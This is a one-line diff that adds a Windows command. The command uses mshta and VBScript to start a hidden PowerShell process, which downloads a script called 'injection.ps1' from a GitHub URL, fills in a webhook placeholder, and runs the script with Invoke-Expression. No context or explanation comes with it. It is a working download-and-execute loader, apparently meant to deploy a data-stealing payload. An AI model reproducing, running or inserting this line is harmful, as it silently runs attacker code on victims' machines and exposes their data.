@@ -1,0 +1,1 @@
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/injection.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE2', 'halo' | iex",0))
